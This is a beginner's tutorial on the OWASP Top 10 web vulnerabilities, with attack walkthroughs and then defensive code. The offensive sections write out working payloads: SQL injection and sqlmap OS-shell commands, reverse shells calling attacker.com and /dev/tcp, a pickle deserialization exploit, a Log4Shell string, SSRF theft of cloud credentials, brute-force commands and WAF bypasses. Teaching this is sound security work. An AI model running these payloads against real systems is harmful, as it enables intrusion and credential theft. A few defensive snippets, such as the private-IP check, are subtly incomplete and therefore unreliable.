# 🛡️ OWASP Top 10 Web Security Vulnerabilities: Zero to Hero Guide

> **"To protect a system, you must first learn how to break it."** - Hacker's Manifesto

---

## 📋 Table of Contents

- [Level 0: Philosophy and Introduction](#level-0-philosophy-and-introduction)
- [Level 1: Fundamental Concepts](#level-1-fundamental-concepts)
- [Level 2: Web Architecture and Protocols](#level-2-web-architecture-and-protocols)
- [Level 3: OWASP Top 10 Vulnerabilities - Offensive](#level-3-owasp-top-10-vulnerabilities---offensive)
  - [A01: Broken Access Control](#a01-broken-access-control)
  - [A02: Cryptographic Failures](#a02-cryptographic-failures)
  - [A03: Injection](#a03-injection)
  - [A04: Insecure Design](#a04-insecure-design)
  - [A05: Security Misconfiguration](#a05-security-misconfiguration)
  - [A06: Vulnerable Components](#a06-vulnerable-and-outdated-components)
  - [A07: Authentication Failures](#a07-identification-and-authentication-failures)
  - [A08: Software Data Integrity](#a08-software-and-data-integrity-failures)
  - [A09: Security Logging Failures](#a09-security-logging-and-monitoring-failures)
  - [A10: SSRF](#a10-server-side-request-forgery-ssrf)
- [Level 4: Defense Strategies](#level-4-defense-strategies)
- [Level 5: Advanced Techniques](#level-5-advanced-techniques)
- [Resources and Lab Environments](#resources-and-lab-environments)

---

## Level 0: Philosophy and Introduction

### 🤔 What is OWASP and Why Does It Matter?

**OWASP (Open Web Application Security Project)** is a nonprofit international organization dedicated to improving web application security. Since 2001, it has documented the most common and critical web security risks and regularly updates this list.

**Real-World Analogy:**
You're building a house. OWASP Top 10 is the "most common reasons buildings collapse" checklist. It teaches critical factors like earthquake resistance, fire safety, and theft prevention to ensure your building is secure.

### 🎯 What Will This Guide Teach You?

This document will teach you, **even with zero security knowledge:**

1. ✅ How web applications work (HTTP, cookies, sessions)
2. ✅ Techniques hackers use (SQL Injection, XSS, CSRF)
3. ✅ How to write secure code and fix vulnerabilities
4. ✅ How to perform professional penetration testing
5. ✅ Web Application Firewall (WAF) bypass techniques

### 📊 OWASP Top 10 (2021) List

```
┌─────────────────────────────────────────────────────────┐
│  OWASP Top 10 - 2021 Web Security Risks                 │
├─────────────────────────────────────────────────────────┤
│ A01:2021 - Broken Access Control                        │
│ A02:2021 - Cryptographic Failures                       │
│ A03:2021 - Injection                                     │
│ A04:2021 - Insecure Design                              │
│ A05:2021 - Security Misconfiguration                    │
│ A06:2021 - Vulnerable and Outdated Components          │
│ A07:2021 - Identification and Authentication Failures   │
│ A08:2021 - Software and Data Integrity Failures        │
│ A09:2021 - Security Logging and Monitoring Failures    │
│ A10:2021 - Server-Side Request Forgery (SSRF)          │
└─────────────────────────────────────────────────────────┘
```

---

## Level 1: Fundamental Concepts

### 🔤 Essential Terminology

#### **Vulnerability**
A weakness or flaw in a system. Like an unlocked door.

#### **Exploit**
A technique or tool used to leverage a vulnerability to compromise a system. Like knowing how to pick the lock.

#### **Payload**
The "malicious payload" of an attack. Example: SQL code executed in SQL Injection.

#### **Attack Vector**
The entry point where an attack is performed. Example: A web form, URL parameter.

#### **Attack Surface**
The sum of all attack-vulnerable points in a system. Like all doors and windows of a house.

### 🌐 Core Web Application Components

```
┌─────────────────────────────────────────────────────┐
│                    Client                            │
│                 [Web Browser]                        │
│                       ↕                              │
│                   HTTP/HTTPS                         │
│                       ↕                              │
│                  Web Server                          │
│            (Apache, Nginx, IIS)                      │
│                       ↕                              │
│             Application Server                       │
│        (PHP, Python, Java, Node.js)                  │
│                       ↕                              │
│                   Database                           │
│          (MySQL, PostgreSQL, MongoDB)                │
└─────────────────────────────────────────────────────┘
```

### 🔐 Security Principles (CIA Triad)

#### **Confidentiality**
Information cannot be viewed by unauthorized parties.
- **Example:** User passwords are hashed

#### **Integrity**
Data cannot be altered without authorization.
- **Example:** Payment amounts cannot be manipulated

#### **Availability**
System is always accessible to authorized users.
- **Example:** Protection against DDoS attacks

---

## Level 2: Web Architecture and Protocols

### 📡 HTTP Protocol Deep Dive

#### **HTTP Request Structure**

```http
GET /user/profile?id=123 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=abc123xyz
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{"data": "example"}
```

**Request Components:**
- **Method:** GET, POST, PUT, DELETE, PATCH
- **Path:** `/user/profile`
- **Query Parameters:** `?id=123`
- **Headers:** Metadata (cookies, authentication, content type)
- **Body:** Data sent in POST/PUT requests

#### **HTTP Response Structure**

```http
HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session=abc123xyz; Secure; HttpOnly
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'

{"username": "john", "email": "john@example.com"}
```

**Response Status Codes:**
- **2xx:** Success (200 OK, 201 Created)
- **3xx:** Redirection (301 Moved, 302 Found)
- **4xx:** Client Error (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found)
- **5xx:** Server Error (500 Internal Server Error, 503 Service Unavailable)

### 🍪 Cookies and Sessions

#### **What is a Cookie?**

A cookie is a small piece of data stored in the browser, typically used for session management.

**Cookie Structure:**
```
Set-Cookie: sessionid=abc123; 
            Domain=example.com; 
            Path=/; 
            Expires=Wed, 21 Oct 2025 07:28:00 GMT; 
            Secure; 
            HttpOnly; 
            SameSite=Strict
```

**Cookie Flags:**
- **Secure:** Only sent over HTTPS
- **HttpOnly:** Cannot be read by JavaScript (XSS protection)
- **SameSite:** Protection against CSRF attacks

### 🔑 Authentication vs Authorization

```
┌─────────────────────────────────────────────────────┐
│  Authentication                                      │
│  "Who are you?"                                      │
│  → Username and password verification                │
│  → Token validation                                  │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  Authorization                                       │
│  "What are you allowed to do?"                       │
│  → Checking user roles                               │
│  → Checking resource access permissions              │
└─────────────────────────────────────────────────────┘
```

---

## Level 3: OWASP Top 10 Vulnerabilities - Offensive

> **⚠️ ETHICAL WARNING:** This information is for educational purposes only. Only test on systems you own or have written permission to test.

---

## A01: Broken Access Control

### 🎯 Vulnerability Description

Broken Access Control occurs when users can access resources or perform actions they're not authorized to.

**Real-World Analogy:**
In a hotel, you're staying in room 101. Your key should only open 101. But if your key can also open rooms 102, 103, or others, that's a "Broken Access Control" problem.

### 🔍 Common Access Control Vulnerabilities

#### **1. IDOR (Insecure Direct Object Reference)**

**Vulnerability:**
```
# User profile page
https://example.com/profile?user_id=1234
```

If changing the `user_id` parameter allows access to other users' profiles, IDOR exists:

```
# Another user's profile
https://example.com/profile?user_id=1235
https://example.com/profile?user_id=1236
```

**Vulnerable Code (PHP):**

```php
<?php
// ❌ INSECURE CODE
$user_id = $_GET['user_id'];  // No user validation!

$query = "SELECT * FROM users WHERE id = $user_id";
$result = mysqli_query($conn, $query);
$user = mysqli_fetch_assoc($result);

echo "Name: " . $user['name'] . "<br>";
echo "Email: " . $user['email'] . "<br>";
echo "Phone: " . $user['phone'] . "<br>";
?>
```

**Why is it vulnerable?**
- No check if the user is the logged-in user
- Everyone can access everyone's information

#### **2. Path Traversal**

**Vulnerability:**
```
https://example.com/download?file=invoice.pdf
```

Attacker can manipulate the `file` parameter to access system files:

```
https://example.com/download?file=../../../etc/passwd
https://example.com/download?file=..\..\..\..\windows\system32\config\sam
```

**Vulnerable Code:**

```python
# ❌ INSECURE CODE
from flask import Flask, request, send_file

@app.route('/download')
def download_file():
    filename = request.args.get('file')
    return send_file(f'/uploads/{filename}')  # Direct concatenation!
```

#### **3. Privilege Escalation**

**Vulnerability Scenario:**
```
Regular user → Access to admin panel
```

**Example:**
```http
POST /user/edit HTTP/1.1
Host: example.com
Cookie: session=user_token

username=hacker&role=admin
```

If the server doesn't validate the `role` parameter, users can make themselves admin.

### 🛠️ Attack Methodology

#### **Step 1: Parameter Discovery**

**Traffic Analysis with Burp Suite:**
```
1. Start Burp Proxy
2. Use the application in browser
3. Search HTTP History for parameters like ID, user_id, file
4. Mark potential IDOR points
```

#### **Step 2: Value Manipulation**

**Systematic Testing:**
```python
# Python Script for IDOR Testing
import requests

base_url = "https://example.com/api/user/"

for user_id in range(1, 1000):
    response = requests.get(f"{base_url}{user_id}", 
                          cookies={"session": "your_token"})
    
    if response.status_code == 200:
        print(f"[+] Accessible: User ID {user_id}")
        print(response.json())
```

#### **Step 3: UUID/Hash Bypass**

Some applications use UUIDs instead of numeric IDs:
```
https://example.com/profile/a3f5c2d1-4b8e-9f7a-1c2d-3e4f5a6b7c8d
```

**Bypass Techniques:**
- **UUID Enumeration:** Some UUIDs are predictable
- **Information Disclosure:** UUIDs leaking in other endpoints
- **Timing Attacks:** Valid/invalid UUID response times may differ

### 🧪 Lab Example

**Vulnerable Application:**

```javascript
// Node.js/Express - Vulnerable Code
app.get('/api/documents/:id', (req, res) => {
    const docId = req.params.id;
    
    // ❌ No user authorization check!
    db.query('SELECT * FROM documents WHERE id = ?', [docId], (err, result) => {
        if (result.length > 0) {
            res.json(result[0]);
        } else {
            res.status(404).send('Document not found');
        }
    });
});
```

**Exploit:**
```bash
# Normal user reads their document
curl https://api.example.com/api/documents/123 \
  -H "Authorization: Bearer user_token"

# IDOR: Read another user's document
curl https://api.example.com/api/documents/456 \
  -H "Authorization: Bearer user_token"
```

---

## A02: Cryptographic Failures

### 🎯 Vulnerability Description

Inadequate or missing encryption of sensitive data.

**Scope:**
- Storing passwords in plaintext
- Weak hash algorithms (MD5, SHA1)
- SSL/TLS misconfiguration
- Missing encryption during sensitive data transmission

### 🔍 Common Cryptographic Failures

#### **1. Plaintext Password Storage**

**❌ Never Do This:**

```sql
-- Plaintext passwords in database
CREATE TABLE users (
    id INT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(100)  -- Plaintext!
);

INSERT INTO users VALUES (1, 'admin', 'Admin123!');
```

**Result:**
If database is compromised, all passwords are exposed.

#### **2. Weak Hash Algorithms**

**❌ Vulnerable Code:**

```python
import hashlib

# MD5 usage - NO LONGER SECURE!
password = "mypassword123"
hashed = hashlib.md5(password.encode()).hexdigest()
# Output: 6f1ed002ab5595859014ebf0951522d9
```

**Why vulnerable?**
- MD5 and SHA1 vulnerable to collision attacks
- Quickly cracked with rainbow tables
- Billions of hashes can be tested per second with GPUs

**Rainbow Table Example:**
```
Password        MD5 Hash
--------        --------
password        5f4dcc3b5aa765d61d8327deb882cf99
123456          e10adc3949ba59abbe56e057f20f883e
admin           21232f297a57a5a743894a0e4a801fc3
```

#### **3. SSL/TLS Misconfiguration**

**Vulnerability Check:**
```bash
# SSL Labs Test
curl https://www.ssllabs.com/ssltest/analyze.html?d=example.com

# Check supported encryption protocols
nmap --script ssl-enum-ciphers -p 443 example.com
```

**Common Mistakes:**
- TLS 1.0 / 1.1 still active (deprecated)
- Weak cipher suites supported
- Self-signed certificate usage
- Expired certificate

### 🛠️ Attack Techniques

#### **Scenario 1: Stealing Password Hashes via SQL Injection**

```sql
-- Steal admin hash
' UNION SELECT username, password_hash FROM users WHERE role='admin'--
```

**Result:**
```
admin:5f4dcc3b5aa765d61d8327deb882cf99
```

#### **Scenario 2: Hash Cracking**

**Cracking MD5 with Hashcat:**
```bash
# Wordlist attack
hashcat -m 0 -a 0 hashes.txt rockyou.txt

# Brute force (8 characters, lowercase + numbers)
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?d?d?d?d

# -m 0: MD5
# -a 0: Wordlist attack
# -a 3: Brute force
```

**With John the Ripper:**
```bash
john --format=raw-md5 --wordlist=rockyou.txt hashes.txt
john --show hashes.txt
```

#### **Scenario 3: Man-in-the-Middle (MITM)**

**Password Transmission over HTTP:**
```
User → [HTTP - PLAINTEXT] → Server
           ↓
      Attacker (listening with Wireshark)
```

**Wireshark Filtering:**
```
http.request.method == "POST" && http contains "password"
```

---

## A03: Injection

### 🎯 Vulnerability Description

Untrusted data from users directly executed as commands or queries by the application.

**Injection Types:**
- SQL Injection
- Command Injection (OS)
- LDAP Injection
- XPath Injection
- NoSQL Injection
- CRLF Injection

### 💉 SQL Injection (SQLi)

#### **How Does It Work?**

**Normal SQL Query:**
```sql
SELECT * FROM users WHERE username='admin' AND password='123456';
```

**Vulnerable Code:**
```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);
?>
```

#### **SQL Injection Attack**

**Input Values:**
```
Username: admin'--
Password: anything
```

**Generated SQL Query:**
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything';
```

**Explanation:**
- `'` closes the quote
- `--` starts a comment in SQL
- Password check is bypassed

#### **SQL Injection Types**

**1. Classic/In-band SQLi**

**Error-Based SQLi:**
```sql
' OR 1=1--
' UNION SELECT NULL, NULL, NULL--
' AND 1=CONVERT(int, (SELECT @@version))--
```

**Union-Based SQLi:**
```sql
' UNION SELECT username, password, email FROM users--
' UNION SELECT 1,2,table_name FROM information_schema.tables--
```

**2. Blind SQLi**

**Boolean-Based:**
```sql
' AND 1=1--  → Page appears normal
' AND 1=2--  → Page errors or looks different
```

**Time-Based:**
```sql
' AND SLEEP(5)--  → If page delays 5 seconds, vulnerability exists
' OR IF(1=1, SLEEP(5), 0)--
```

**3. Out-of-Band SQLi**
```sql
'; EXEC xp_cmdshell('nslookup attacker.com')--
```

### 🧪 SQLi Attack Methodology

#### **Step 1: Vulnerability Detection**

**Test Payloads:**
```
'
"
`
')
")
`))
')--
")--
' OR '1'='1
" OR "1"="1
' OR '1'='1'--
" OR "1"="1"--
```

**Response Analysis:**
```
✓ SQL error → Error-Based SQLi potential
✓ Page change → Boolean-Based SQLi potential
✓ Time delay → Time-Based SQLi potential
✓ Different data → Union-Based SQLi potential
```

#### **Step 2: Column Count Detection (for UNION)**

```sql
' ORDER BY 1--  ✓ Works
' ORDER BY 2--  ✓ Works
' ORDER BY 3--  ✓ Works
' ORDER BY 4--  ✗ Error → 3 columns exist
```

#### **Step 3: Extract Database Information**

**MySQL:**
```sql
' UNION SELECT NULL, @@version, database()--
' UNION SELECT NULL, user(), schema_name FROM information_schema.schemata--
```

**PostgreSQL:**
```sql
' UNION SELECT NULL, version(), current_database()--
```

**MSSQL:**
```sql
' UNION SELECT NULL, @@version, DB_NAME()--
```

#### **Step 4: Table and Column Names**

```sql
-- Get table names (MySQL)
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- Get column names
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```

#### **Step 5: Extract Sensitive Data**

```sql
' UNION SELECT username, password FROM users--
' UNION SELECT group_concat(username,':',password) FROM users--
```

### 🔧 Automated SQLi with SQLMap

```bash
# Basic scan
sqlmap -u "http://example.com/page?id=1"

# Authenticated scan with cookie
sqlmap -u "http://example.com/page?id=1" \
       --cookie="PHPSESSID=abc123xyz"

# POST request
sqlmap -u "http://example.com/login" \
       --data="username=admin&password=pass" \
       -p username

# Database dump
sqlmap -u "http://example.com/page?id=1" --dbs
sqlmap -u "http://example.com/page?id=1" -D database_name --tables
sqlmap -u "http://example.com/page?id=1" -D database_name -T users --dump

# Get OS Shell
sqlmap -u "http://example.com/page?id=1" --os-shell
```

### 💻 Command Injection

#### **Vulnerability Scenario**

**Vulnerable Code (PHP):**
```php
<?php
$ip = $_GET['ip'];
$output = shell_exec("ping -c 4 " . $ip);
echo "<pre>$output</pre>";
?>
```

**URL:**
```
http://example.com/ping.php?ip=8.8.8.8
```

#### **Attack**

**Payload:**
```
http://example.com/ping.php?ip=8.8.8.8; whoami
http://example.com/ping.php?ip=8.8.8.8; cat /etc/passwd
http://example.com/ping.php?ip=8.8.8.8 && ls -la
http://example.com/ping.php?ip=8.8.8.8 | nc attacker.com 4444 -e /bin/bash
```

**Executed Command:**
```bash
ping -c 4 8.8.8.8; whoami
```

#### **Getting Reverse Shell**

```bash
# Start listener on attacker machine
nc -lvnp 4444

# On target server (via Command Injection)
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

**URL Encoded:**
```
http://example.com/ping.php?ip=8.8.8.8;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.5%2F4444%200%3E%261
```

---

## A04: Insecure Design

### 🎯 Vulnerability Description

Security requirements not considered or incorrectly implemented during the design phase.

**Difference:**
- **Insecure Implementation:** Secure design but poor code
- **Insecure Design:** Fundamental design flaw

### 📊 Common Design Flaws

#### **1. Missing Rate Limiting**

**Vulnerability Scenario:**
```
Login page → Unlimited attempts
```

**Brute Force Attack:**
```python
import requests

passwords = ['123456', 'password', 'admin123', '12345678']

for pwd in passwords:
    response = requests.post('http://example.com/login', 
                           data={'username': 'admin', 'password': pwd})
    
    if 'Welcome' in response.text:
        print(f"[+] Password found: {pwd}")
        break
```

#### **2. Business Logic Bypass**

**Vulnerability Example - E-commerce:**

```
1. Add product to cart: laptop = $1000
2. Checkout page: Total = $1000
3. Intercept request with Burp
4. Change price value: price=-1000
5. Send request
6. Result: You receive money instead of paying!
```

**Vulnerable Code:**
```javascript
// ❌ Price taken from client-side!
app.post('/checkout', (req, res) => {
    const { product_id, price, quantity } = req.body;
    const total = price * quantity;  // User can manipulate price!
    
    processPayment(total);
});
```

#### **3. Account Enumeration**

**Vulnerability:**
```
Login error: "Username or password incorrect" ✓ SECURE
Login error: "This user doesn't exist" ✗ INSECURE
```

**Attack:**
```python
# Detect existing usernames
usernames = ['admin', 'root', 'user', 'test']

for user in usernames:
    response = requests.post('/login', data={'username': user, 'password': 'wrong'})
    
    if 'user does not exist' in response.text:
        print(f"[-] {user} doesn't exist")
    else:
        print(f"[+] {user} exists - brute force target!")
```

---

## A05: Security Misconfiguration

### 🎯 Common Misconfigurations

#### **1. Default Credentials**

**Common Default Passwords:**
```
admin:admin
admin:password
root:root
admin:12345
administrator:administrator
```

**Check:**
```bash
# Brute force with Hydra
hydra -L users.txt -P passwords.txt http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

#### **2. Directory Listing Enabled**

**Vulnerability:**
```
http://example.com/uploads/
→ List of all uploaded files visible!
```

**Apache Directory Listing:**
```apache
<Directory /var/www/html/uploads>
    Options +Indexes  # ❌ This line is dangerous!
</Directory>
```

#### **3. Sensitive File Disclosure**

**Common Target Files:**
```
/.git/config
/.env
/config.php
/wp-config.php
/web.config
/.DS_Store
/robots.txt
/sitemap.xml
/phpinfo.php
/server-status
/.htaccess
```

**Scanning:**
```bash
# Directory scanning with FFUF
ffuf -u http://example.com/FUZZ -w wordlist.txt

# With Gobuster
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt

# Vulnerability scan with Nikto
nikto -h http://example.com
```

#### **4. Stack Trace Disclosure**

**❌ Debug Mode in Production:**
```python
# Flask
app.run(debug=True)  # ❌ NEVER USE IN PRODUCTION!
```

**Result:**
```
Traceback (most recent call last):
  File "/var/www/app.py", line 42, in process_payment
    db.execute("INSERT INTO orders VALUES (?, ?, ?)", order_id, user_id, total)
sqlite3.OperationalError: no such table: orders
```

**Attacker learns:**
- File structure (`/var/www/app.py`)
- Database type (SQLite)
- Table names and structure
- Code logic

---

## A06: Vulnerable and Outdated Components

### 🎯 Vulnerability Description

Using outdated or vulnerable libraries, frameworks, and components.

### 🔍 Vulnerability Detection

#### **1. Dependency Scanning**

**NPM Audit (Node.js):**
```bash
npm audit
npm audit fix
npm audit fix --force
```

**Pip Check (Python):**
```bash
pip list --outdated
safety check
```

**Composer (PHP):**
```bash
composer outdated
composer audit
```

#### **2. CVE Database Check**

**Online Tools:**
- [CVE Details](https://www.cvedetails.com/)
- [National Vulnerability Database](https://nvd.nist.gov/)
- [Snyk Vulnerability DB](https://snyk.io/vuln)

**Example CVE Search:**
```
jQuery 1.x.x → CVE-2020-11022 (XSS)
Apache Struts 2.3.x → CVE-2017-5638 (RCE)
Log4j 2.x → CVE-2021-44228 (RCE - Log4Shell)
```

### 🛠️ Real-World Example: Log4Shell

**CVE-2021-44228 (Log4Shell):**

**Vulnerability:**
```java
// Logging with Log4j
logger.info("User {} logged in", userInput);
```

**Exploit:**
```
${jndi:ldap://attacker.com/exploit}
```

**Attack Flow:**
```
1. Attacker sends malicious JNDI string
2. Log4j parses this string
3. Connects to LDAP server
4. Downloads and executes malicious Java class
5. Remote Code Execution (RCE)!
```

---

## A07: Identification and Authentication Failures

### 🎯 Vulnerability Types

#### **1. Weak Password Policy**

**❌ Weak Policy:**
```
- Minimum 6 characters
- No special characters required
- Password change not mandatory
```

**Brute Force Cracking:**
```bash
# With Hydra
hydra -l admin -P rockyou.txt http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid"

# With Medusa
medusa -h example.com -u admin -P rockyou.txt -M http \
  -m DIR:/login -m FORM:"username=^USER^&password=^PASS^" \
  -m DENY:"Invalid"
```

#### **2. Session Fixation**

**Vulnerability:**
```
1. Attacker creates session ID: ABC123
2. Places this session ID in victim's browser
3. Victim logs in
4. Session ID doesn't change (still ABC123)
5. Attacker logs in with ABC123 → Session hijacked!
```

**Vulnerable Code:**
```php
<?php
session_start();  // Uses existing session ID
// ❌ session_regenerate_id() not called after login!

if ($_POST['username'] == 'admin' && $_POST['password'] == 'pass') {
    $_SESSION['logged_in'] = true;
    $_SESSION['username'] = 'admin';
}
?>
```

#### **3. JWT Vulnerabilities**

**JWT Structure:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.signature
    ↓           ↓                                  ↓               ↓
  Header      Payload                           Signature
```

**Decode:**
```json
// Header
{"alg": "HS256", "typ": "JWT"}

// Payload
{"user": "admin", "role": "user"}
```

**Common JWT Vulnerabilities:**

**1) Algorithm Confusion:**
```json
// ❌ Change "alg" to "none"
{"alg": "none", "typ": "JWT"}
{"user": "admin", "role": "admin"}
```

**2) Weak Secret:**
```bash
# JWT Cracking (hashcat)
hashcat -m 16500 -a 0 jwt.txt rockyou.txt
```

**3) Key Confusion (RS256 → HS256):**
```
RS256: Uses public/private key
HS256: Uses secret key

Attack: Create JWT using public key as secret!
```

---

## A08: Software and Data Integrity Failures

### 🎯 Vulnerability Description

**Scope:**
- Running code from untrusted sources
- CI/CD pipeline vulnerabilities
- Auto-update mechanism hijacking
- Deserialization attacks

### 💣 Insecure Deserialization

#### **What is the Vulnerability?**

Serialization: Converting object to byte stream
Deserialization: Converting byte stream back to object

**Vulnerability:** Deserializing untrusted data → RCE!

#### **Python Pickle Example**

**Vulnerable Code:**
```python
import pickle

# ❌ Don't deserialize user data!
user_data = request.cookies.get('session')
session = pickle.loads(base64.b64decode(user_data))
```

**Exploit:**
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('nc attacker.com 4444 -e /bin/bash',))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload))
```

#### **PHP Unserialize**

**Vulnerability:**
```php
<?php
$data = $_COOKIE['user'];
$user = unserialize($data);  // ❌ Dangerous!
?>
```

**Magic Methods Exploitation:**
```php
class Evil {
    public $cmd;
    
    function __destruct() {
        system($this->cmd);  // Runs when object destroyed
    }
}

$payload = 'O:4:"Evil":1:{s:3:"cmd";s:10:"cat /etc/passwd";}';
```

---

## A09: Security Logging and Monitoring Failures

### 🎯 Vulnerability Description

Missing log and monitoring mechanisms needed to detect and respond to attacks.

### 📝 Events That Should Be Logged

```
✓ Login attempts (successful and failed)
✓ Privilege escalation attempts
✓ Input validation errors
✓ Authentication/Authorization errors
✓ Application errors and exceptions
✓ Critical operations (password change, payment, etc.)
```

### 🔍 Log Analysis

**Suspicious Activity Detection:**
```bash
# Brute force detection (many failed logins)
grep "Failed login" /var/log/auth.log | cut -d' ' -f1-3,11 | sort | uniq -c | sort -nr

# SQL Injection attempt detection
grep -i "union\|select\|drop\|insert" /var/log/apache2/access.log

# Directory traversal detection
grep -E "\.\./|\.\.\\" /var/log/apache2/access.log
```

---

## A10: Server-Side Request Forgery (SSRF)

### 🎯 Vulnerability Description

Server making requests to URLs controlled by the attacker.

### 🔍 SSRF Attack Scenarios

#### **1. Internal Network Scanning**

**Vulnerable Code:**
```python
from flask import Flask, request
import requests

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    response = requests.get(url)  # ❌ URL not validated!
    return response.content
```

**Exploit:**
```
http://example.com/fetch?url=http://localhost:22
http://example.com/fetch?url=http://127.0.0.1:3306
http://example.com/fetch?url=http://192.168.1.1/admin
```

#### **2. AWS Metadata Endpoint**

**AWS EC2 Metadata:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Attack:**
```
http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
```

**Result:**
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalr...",
  "Token": "FwoGZXIvYXdz..."
}
```

#### **3. SSRF Bypass Techniques**

**Blacklist Bypass:**
```
localhost → 127.0.0.1 → 127.1 → 0.0.0.0
localhost → [::1]
localhost → localtest.me
```

**URL Parsing Tricks:**
```
http://example.com@localhost
http://localhost#example.com
http://example.com.localhost
```

---

## Level 4: Defense Strategies

### 🛡️ Broken Access Control Defense

#### **✅ Secure Code Examples**

**IDOR Protection (PHP):**
```php
<?php
session_start();

$requested_user_id = $_GET['user_id'];
$logged_in_user_id = $_SESSION['user_id'];

// User can only view their own profile
if ($requested_user_id != $logged_in_user_id) {
    http_response_code(403);
    die("Access Denied");
}

$query = "SELECT * FROM users WHERE id = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param("i", $logged_in_user_id);
$stmt->execute();
?>
```

**Path Traversal Protection (Python):**
```python
import os
from flask import Flask, request, send_file, abort

UPLOAD_FOLDER = '/var/www/uploads'

@app.route('/download')
def download_file():
    filename = request.args.get('file')
    
    # Create safe path
    safe_path = os.path.join(UPLOAD_FOLDER, filename)
    
    # Path traversal check
    if not os.path.abspath(safe_path).startswith(UPLOAD_FOLDER):
        abort(403)
    
    # Check if file exists
    if not os.path.isfile(safe_path):
        abort(404)
    
    return send_file(safe_path)
```

### 🔐 Cryptographic Failures Defense

**✅ Secure Password Storage (bcrypt):**

```python
import bcrypt

# Hash password (during registration)
def hash_password(password):
    salt = bcrypt.gensalt(rounds=12)  # Cost factor: 12
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    return hashed

# Verify password (during login)
def verify_password(password, hashed):
    return bcrypt.checkpw(password.encode('utf-8'), hashed)
```

**PHP (password_hash):**
```php
<?php
// Registration
$hashed_password = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);

// Login
if (password_verify($password, $hashed_password)) {
    echo "Login successful!";
}
?>
```

### 💉 Injection Defense

**✅ Prepared Statements (SQL Injection Protection):**

```php
<?php
// ❌ INSECURE
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";

// ✅ SECURE - Prepared Statement
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $hashed_password);
$stmt->execute();
?>
```

**Parameterized Query (Python):**
```python
# ✅ SECURE
cursor.execute("SELECT * FROM users WHERE username=? AND email=?", (username, email))
```

**Command Injection Protection:**
```python
import subprocess
import shlex

# ❌ INSECURE
os.system("ping " + ip)

# ✅ SECURE - Use shlex.quote
safe_ip = shlex.quote(ip)
subprocess.run(["ping", "-c", "4", safe_ip])
```

### 🔒 Authentication Defense

**✅ Secure Session Management:**
```php
<?php
session_start();

// Regenerate session ID after login
if (login_successful()) {
    session_regenerate_id(true);  // Delete old session
    $_SESSION['user_id'] = $user_id;
    $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];
    $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
}

// Validate session on each request
function validate_session() {
    if ($_SESSION['ip_address'] != $_SERVER['REMOTE_ADDR']) {
        session_destroy();
        die("Session hijacking detected!");
    }
}
?>
```

**Rate Limiting (Python/Flask):**
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # 5 attempts per minute
def login():
    # Login logic
    pass
```

### 🛡️ SSRF Defense

**✅ URL Whitelist:**
```python
import re
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']

def fetch_url(url):
    parsed = urlparse(url)
    
    # Protocol check
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Invalid protocol")
    
    # Domain whitelist check
    if parsed.netloc not in ALLOWED_DOMAINS:
        raise ValueError("Domain not allowed")
    
    # Private IP check
    if is_private_ip(parsed.netloc):
        raise ValueError("Private IP not allowed")
    
    return requests.get(url)

def is_private_ip(hostname):
    private_ranges = [
        '127.', '10.', '172.16.', '172.31.', '192.168.', '169.254.'
    ]
    return any(hostname.startswith(range) for range in private_ranges)
```

---

## Level 5: Advanced Techniques

### 🔥 WAF Bypass Techniques

#### **1. SQL Injection WAF Bypass**

**Case Manipulation:**
```sql
' UnIoN SeLeCt 1,2,3--
```

**Comment Insertion:**
```sql
'/**/UNION/**/SELECT/**/1,2,3--
```

**URL Encoding:**
```
%27%20UNION%20SELECT%201,2,3--
```

**Double Encoding:**
```
%2527%2520UNION%2520SELECT%25201,2,3--
```

**Inline Comments:**
```sql
'/*!50000UNION*//*!50000SELECT*/1,2,3--
```

#### **2. XSS WAF Bypass**

**HTML Entity Encoding:**
```html
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
```

**Alternate Event Handlers:**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

**Unicode Bypass:**
```javascript
<script>\u0061lert(1)</script>
```

### 🔗 Vulnerability Chaining

**Scenario: IDOR + XSS → Account Takeover**

```
1. Change another user's email via IDOR
2. Steal reset password link via XSS
3. Password reset link sent to your email
4. Account takeover complete!
```

